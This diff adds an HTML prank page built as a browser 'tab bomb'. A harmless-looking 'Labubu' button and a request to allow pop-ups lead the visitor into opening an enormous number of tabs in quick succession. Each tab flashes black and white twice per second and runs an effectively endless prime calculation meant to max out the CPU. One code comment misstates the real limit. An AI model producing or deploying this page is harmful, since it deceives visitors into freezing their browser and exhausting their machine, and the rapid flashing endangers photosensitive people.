@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOL</title>
+    <style>
+        body {
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            font-family: sans-serif;
+            background-color: #f0f0f0;
+        }
+        .container {
+            text-align: center;
+        }
+        #openTabsBtn {
+            padding: 15px 30px;
+            font-size: 1.25rem;
+            cursor: pointer;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            transition: background-color 0.3s ease;
+        }
+        #openTabsBtn:hover {
+            background-color: #0056b3;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <button id="openTabsBtn">Labubu</button>
+        <p>You may need to allow pop-ups for this to work.</p>
+    </div>
+    <script>
+        // Store the content for the dynamic tabs
+        const tabContent = `
+            <!DOCTYPE html>
+            <html lang="en">
+            <head>
+                <title>LOLL</title>
+                <style>
+                    body {
+                        margin: 0;
+                        height: 100vh;
+                        display: flex;
+                        justify-content: center;
+                        align-items: center;
+                        overflow: hidden;
+                        animation: flashingBackground 0.5s infinite;
+                    }
+                    @keyframes flashingBackground {
+                        0% { background-color: black; }
+                        50% { background-color: white; }
+                        100% { background-color: black; }
+                    }
+                    .bouncing-text {
+                        font-family: 'Comic Sans MS', cursive, sans-serif;
+                        font-size: 5rem;
+                        color: white;
+                        text-shadow: 2px 2px 4px black;
+                        animation: bounce 1s infinite alternate;
+                        text-transform: uppercase;
+                    }
+                    @keyframes bounce {
+                        0% { transform: translateY(0); }
+                        100% { transform: translateY(-50px); }
+                    }
+                    #result {
+                        margin-top: 20px;
+                        color: red;
+                        font-size: 1.5rem;
+                        font-family: monospace;
+                    }
+                </style>
+            </head>
+            <body>
+                <h1 class="bouncing-text">LOLL</h1>
+                <div id="result"></div>
+                <script>
+                    // CPU-intensive JavaScript: Prime number calculation
+                    function findPrimes(limit) {
+                        const primes = [];
+                        for (let i = 2; i <= limit; i++) {
+                            let isPrime = true;
+                            for (let j = 2; j <= Math.sqrt(i); j++) {
+                                if (i % j === 0) {
+                                    isPrime = false;
+                                    break;
+                                }
+                            }
+                            if (isPrime) {
+                                primes.push(i);
+                            }
+                        }
+                        return primes;
+                    }
+
+                    // Increased limit to 100000 to make it more intensive
+                    const primeLimit = 900000000000000000;
+                    const startTime = performance.now();
+                    const foundPrimes = findPrimes(primeLimit);
+                    const endTime = performance.now();
+                    const timeTaken = (endTime - startTime).toFixed(2);
+                    document.getElementById('result').innerText = '';
+                    document.querySelector('.bouncing-text').innerText = 'LOL you thought';
+                <\/script>
+            </body>
+            </html>
+        `;
+
+        document.getElementById('openTabsBtn').addEventListener('click', function() {
+            // Number of tabs to open
+            const numberOfTabs = 900000000000000000;
+
+            // Use an interval to attempt to open tabs sequentially with a delay
+            // This still likely won't work in modern browsers due to pop-up blockers
+            let tabsOpened = 0;
+            const openInterval = setInterval(() => {
+                if (tabsOpened >= numberOfTabs) {
+                    clearInterval(openInterval);
+                    return;
+                }
+
+                // The name must be unique for each tab to ensure a new one opens
+                const newTab = window.open('about:blank', `tab_${Date.now()}_${tabsOpened}`);
+
+                if (newTab) {
+                    newTab.document.write(tabContent);
+                    newTab.document.close();
+                    tabsOpened++;
+                } else {
+                    alert("Pop-up blocker is preventing new tabs from opening. You may need to disable it manually.");
+                    clearInterval(openInterval); // Stop trying if a block occurs
+                }
+            }, 100); // 100ms delay between attempts
+        });
+    </script>
+</body>
+</html>
